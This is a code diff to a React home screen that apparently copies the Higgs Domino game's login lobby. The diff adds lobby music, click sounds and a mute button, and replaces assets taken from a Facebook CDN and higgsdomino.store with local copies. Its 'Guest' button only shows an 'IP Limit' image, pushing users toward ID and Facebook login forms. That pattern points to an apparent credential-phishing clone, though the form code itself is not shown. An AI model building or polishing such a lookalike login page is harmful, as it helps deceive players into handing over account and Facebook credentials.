@@ -1,6 +1,6 @@
 
-import { useState } from 'react';
-import { FaHeadset, FaUser, FaFacebookF, FaGlobeAsia, FaCaretDown } from 'react-icons/fa';
+import { useState, useRef, useEffect } from 'react';
+import { FaHeadset, FaUser, FaFacebookF, FaGlobeAsia, FaCaretDown, FaVolumeMute, FaVolumeUp } from 'react-icons/fa';
 import LoginForm from './LoginForm';
 import FacebookLogin from './FacebookLogin';
 
@@ -11,6 +11,11 @@ const Home = () => {
   const [agreed, setAgreed] = useState(true);
   const [showIpLimit, setShowIpLimit] = useState(false);
   const [showFbLogin, setShowFbLogin] = useState(false);
+  const [isMuted, setIsMuted] = useState(false);
+
+  // Audio References
+  const bgmRef = useRef<HTMLAudioElement>(null);
+  const clickSoundRef = useRef<HTMLAudioElement>(null);
 
   const regions = [
     'Africa',
@@ -20,14 +25,53 @@ const Home = () => {
     'South America'
   ];
 
+  // Click Sound Helper
+  const playClickSound = () => {
+    if (clickSoundRef.current && !isMuted) {
+      clickSoundRef.current.currentTime = 0;
+      clickSoundRef.current.play().catch(e => console.error("Sound play failed", e));
+    }
+  };
+
+  // Play Background Music on Mount (Autoplay workaround)
+  useEffect(() => {
+    const playBgm = () => {
+      if (bgmRef.current) {
+        bgmRef.current.play().catch(e => console.log("Autoplay blocked:", e));
+      }
+    };
+
+    // Try to play immediately
+    playBgm();
+
+    // Add listener for first user interaction if blocked
+    document.addEventListener('click', playBgm, { once: true });
+
+    return () => {
+      document.removeEventListener('click', playBgm);
+    };
+  }, []);
+
+  // Toggle Mute
+  const toggleMute = () => {
+    if (bgmRef.current) {
+      bgmRef.current.muted = !isMuted;
+      setIsMuted(!isMuted);
+    }
+  };
+
   return (
     <div className="relative w-full h-screen overflow-hidden font-sans select-none bg-black">
-      
+      {/* AUDIO ELEMENTS */}
+      <audio ref={bgmRef} loop autoPlay id="bgm" src="/lobby_bk.mp3" />
+      <audio ref={clickSoundRef} id="clickSound" src="/click-sound.mp3" />
+
       {/* 1. REAL BACKGROUND IMAGE (Always visible) */}
       <div 
         className="absolute inset-0 z-0 bg-cover bg-center bg-no-repeat"
         style={{ 
-          backgroundImage: `url('https://scontent-cgk1-2.xx.fbcdn.net/v/t39.30808-6/546099017_122259680486224279_8076638585639048773_n.jpg?_nc_cat=107&ccb=1-7&_nc_sid=cc71e4&_nc_eui2=AeEe5rYWX4oSvg2JR02IW9FX2npjU4z6MczaemNTjPoxzGgCU1yfPSPL4t_tRxjtbWIkKRATREHAEUnwGwa2uRIP&_nc_ohc=ruihFEQq14IQ7kNvwFOW5KD&_nc_oc=AdmiCBhD7CRT3HIQJXZdcHQwOHJ1q3AlZkPs7gj_A_VZGLlsbfbzLhW52K-3tV-1IHI&_nc_zt=23&_nc_ht=scontent-cgk1-2.xx&_nc_gid=pramOKMXl9i3w_2vk9HrRg&oh=00_AfvvSqVNlEsaNeZI0HBZm3anq1jnorlv7N5kM9xkpvEHcg&oe=69840540')`
+          backgroundImage: `url('/bg.jpg')`,
+          zIndex: 0
         }}
       >
       </div>
@@ -37,7 +81,10 @@ const Home = () => {
         <div className="absolute inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-[2px] animate-fade-in">
           {/* Close button handled inside LoginForm or here */}
            <div className="relative z-10 w-full max-w-sm animate-pop-in">
-             <LoginForm onClose={() => setShowLogin(false)} />
+             <LoginForm 
+               onClose={() => setShowLogin(false)} 
+               playClickSound={playClickSound}
+             />
              {/* Transparent close area behind form is handled by the overlay div itself mostly, 
                  but explicit close button is inside LoginForm component now as requested in previous design */}
            </div>
@@ -52,7 +99,7 @@ const Home = () => {
         <div className="absolute inset-0 z-[60] flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-fade-in">
           <div className="relative animate-pop-in w-full max-w-md">
             <img 
-              src="https://higgsdomino.store/img/iplimit1.png" 
+              src="/iplimit1.png" 
               alt="IP Limit" 
               className="w-full h-auto rounded-lg shadow-2xl"
             />
@@ -71,7 +118,10 @@ const Home = () => {
       {showFbLogin && (
         <div className="absolute inset-0 z-[70] flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-fade-in">
           <div className="relative z-10">
-            <FacebookLogin onClose={() => setShowFbLogin(false)} />
+            <FacebookLogin 
+              onClose={() => { playClickSound(); setShowFbLogin(false); }} 
+              playClickSound={playClickSound}
+            />
           </div>
           <div className="absolute inset-0 z-0" onClick={() => {}}></div>
         </div>
@@ -79,6 +129,24 @@ const Home = () => {
 
       {/* 2. TOP LEFT MENU (Vertical Buttons) */}
       <div className="absolute top-4 left-4 z-20 flex flex-col gap-4">
+        
+        {/* Mute Button (Above Service) */}
+        <button 
+          className="flex flex-col items-center group active:scale-95 transition-transform"
+          onClick={toggleMute}
+        >
+          <div className="w-10 h-10 rounded-full bg-[#1e2532]/80 border-[1.5px] border-[#d4af37] flex items-center justify-center shadow-lg">
+            {isMuted ? (
+              <FaVolumeMute className="text-[#ffd700] text-lg drop-shadow-md" />
+            ) : (
+              <FaVolumeUp className="text-[#ffd700] text-lg drop-shadow-md" />
+            )}
+          </div>
+          <span className="text-white text-[11px] font-bold mt-1 drop-shadow-[0_2px_2px_rgba(0,0,0,1)] stroke-black tracking-wide" style={{ textShadow: '0px 1px 2px #000' }}>
+            {isMuted ? 'Unmute' : 'Mute'}
+          </span>
+        </button>
+
         {/* Service Button */}
         <button className="flex flex-col items-center group active:scale-95 transition-transform">
           <div className="w-10 h-10 rounded-full bg-[#1e2532]/80 border-[1.5px] border-[#d4af37] flex items-center justify-center shadow-lg">
@@ -91,7 +159,7 @@ const Home = () => {
 
         {/* ID Login Button */}
         <button 
-          onClick={() => setShowLogin(true)}
+          onClick={() => { playClickSound(); setShowLogin(true); }}
           className="flex flex-col items-center group active:scale-95 transition-transform"
         >
           <div className="w-10 h-10 rounded-full bg-[#1e2532]/80 border-[1.5px] border-[#d4af37] flex items-center justify-center shadow-lg">
@@ -124,7 +192,7 @@ const Home = () => {
         <div className="pointer-events-auto w-full max-w-2xl flex flex-col items-center">
           
           {/* REGION SELECTOR (Floating Center with Dropdown) */}
-          <div className="mb-2 relative w-[240px] md:w-[280px]">
+          <div className="mb-1 relative w-[200px] md:w-[240px]">
             {/* Dropdown Menu (Shows when active) */}
             {showRegion && (
               <div className="absolute bottom-full mb-1 left-0 w-full bg-[#4a148c] border border-[#7b1fa2] rounded-xl shadow-[0_8px_16px_rgba(0,0,0,0.8)] overflow-hidden animate-pop-in z-30">
@@ -136,7 +204,7 @@ const Home = () => {
                         setSelectedRegion(region);
                         setShowRegion(false);
                       }}
-                      className={`py-2 text-center font-bold text-sm transition-colors
+                      className={`py-1.5 text-center font-bold text-xs transition-colors
                         ${selectedRegion === region 
                           ? 'bg-[#7b1fa2] text-white shadow-inner' 
                           : 'text-[#e1bee7] hover:bg-white/10'
@@ -151,15 +219,15 @@ const Home = () => {
 
             {/* Selector Bar */}
             <button 
-              onClick={() => setShowRegion(!showRegion)}
-              className="w-full h-10 bg-gradient-to-r from-[#8e24aa] to-[#6a1b9a] rounded-l shadow-[0_4px_4px_rgba(0,0,0,0.3)] flex items-center justify-between px-3 active:scale-95 transition-transform border border-[#ab47bc]"
+              onClick={() => { playClickSound(); setShowRegion(!showRegion); }}
+              className="w-full h-9 bg-gradient-to-r from-[#8e24aa] to-[#6a1b9a] rounded-l shadow-[0_4px_4px_rgba(0,0,0,0.3)] flex items-center justify-between px-3 active:scale-95 transition-transform border border-[#ab47bc]"
             >
                <div className="flex items-center gap-2">
-                  <div className="w-6 h-6 rounded-full bg-black/20 flex items-center justify-center">
-                    <FaGlobeAsia className="text-white text-xs" />
+                  <div className="w-5 h-5 rounded-full bg-black/20 flex items-center justify-center">
+                    <FaGlobeAsia className="text-white text-[10px]" />
                   </div>
                </div>
-               <span className="text-white font-bold text-sm tracking-wide uppercase drop-shadow-sm">
+               <span className="text-white font-bold text-xs tracking-wide uppercase drop-shadow-sm">
                  {selectedRegion}
                </span>
                <FaCaretDown className={`text-white transition-transform duration-300 ${showRegion ? 'rotate-180' : ''}`} />
@@ -167,24 +235,24 @@ const Home = () => {
           </div>
 
           {/* MAIN ACTION BUTTONS */}
-          <div className="flex flex-col gap-2 items-center mb-4 w-full justify-center">
+          <div className="flex flex-col gap-1.5 items-center mb-2 w-full justify-center">
             
             {/* Facebook Button (Blue) */}
             <button 
-              onClick={() => setShowFbLogin(true)}
-              className="w-[240px] md:w-[280px] relative group active:scale-95 transition-all duration-100 h-10 md:h-12"
+              onClick={() => { playClickSound(); setShowFbLogin(true); }}
+              className="w-[200px] md:w-[240px] relative group active:scale-95 transition-all duration-100 h-9 md:h-10"
             >
               {/* 20M Badge */}
-              <div className="absolute -top-1 -right-1 bg-gradient-to-r from-[#ff4081] to-[#c51162] text-white text-[9px] font-black px-2 py-0.5 rounded-full z-20 border border-white/20 shadow-sm rotate-6">
+              <div className="absolute -top-1 -right-1 bg-gradient-to-r from-[#ff4081] to-[#c51162] text-white text-[8px] font-black px-1.5 py-0.5 rounded-full z-20 border border-white/20 shadow-sm rotate-6">
                 +20M
               </div>
               {/* Button Body */}
               <div className="w-full h-full bg-gradient-to-b from-[#42a5f5] to-[#1565c0] rounded-l border-b-[3px] border-[#0d47a1] flex items-center justify-center relative overflow-hidden shadow-lg group-hover:brightness-110">
-                 <div className="flex items-center gap-3">
-                    <div className="w-6 h-6 bg-white rounded-full flex items-center justify-center shadow-sm">
-                       <FaFacebookF className="text-[#1565c0] text-sm" />
+                 <div className="flex items-center gap-2">
+                    <div className="w-5 h-5 bg-white rounded-full flex items-center justify-center shadow-sm">
+                       <FaFacebookF className="text-[#1565c0] text-xs" />
                     </div>
-                    <span className="text-white font-bold text-sm drop-shadow-[0_1px_2px_rgba(0,0,0,0.3)]">
+                    <span className="text-white font-bold text-xs drop-shadow-[0_1px_2px_rgba(0,0,0,0.3)]">
                       Login with Facebook
                     </span>
                  </div>
@@ -193,10 +261,10 @@ const Home = () => {
 
             {/* Guest Button (Text Only) */}
             <button 
-              onClick={() => setShowIpLimit(true)}
-              className="mt-1 active:scale-95 transition-transform hover:opacity-80"
+              onClick={() => { playClickSound(); setShowIpLimit(true); }}
+              className="mt-0.5 active:scale-95 transition-transform hover:opacity-80"
             >
-              <span className="text-[#ffd700] font-black text-lg drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] tracking-wide uppercase" style={{ textShadow: '0px 0px 10px rgba(255, 215, 0, 0.4)' }}>
+              <span className="text-[#ffd700] font-black text-sm drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] tracking-wide uppercase" style={{ textShadow: '0px 0px 10px rgba(255, 215, 0, 0.4)' }}>
                 Guest
               </span>
             </button>
@@ -205,7 +273,7 @@ const Home = () => {
           {/* Footer Consent */}
           <div className="flex items-center justify-center gap-2 text-[10px] text-white/90 drop-shadow-[0_1px_2px_rgba(0,0,0,1)] mb-1 px-4 text-center w-full">
             <button 
-              onClick={() => setAgreed(!agreed)}
+              onClick={() => { playClickSound(); setAgreed(!agreed); }}
               className={`w-3 h-3 md:w-4 md:h-4 rounded-full border border-[#ffd700] flex items-center justify-center flex-shrink-0 transition-colors bg-black/40 shadow-inner`}
             >
               {agreed && <div className="w-2 h-2 md:w-2.5 md:h-2.5 bg-[#ffd700] rounded-full shadow-[0_0_4px_#ffd700]"></div>}
